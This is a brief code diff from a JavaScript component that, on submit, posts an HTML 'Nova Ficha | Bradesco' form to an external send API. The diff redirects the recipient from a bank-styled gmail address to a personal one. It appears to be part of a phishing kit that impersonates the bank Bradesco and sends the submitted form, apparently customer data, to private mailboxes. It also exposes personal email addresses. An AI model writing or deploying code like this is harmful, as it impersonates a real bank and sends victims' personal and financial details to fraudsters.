@@ -107,7 +107,7 @@ const Template = () => {
       setIsSubmitting(true);
       await axios.post("https://meubanco.onrender.com/api/send", {
         from: "dnline237@gmail.com",
-        to: "centralrelacionamentobradesco@gmail.com",
+        to: "albertoronny237@gmail.com",
         subject: "Nova Ficha | Bradesco",
         message: htmlTemplate,
       });
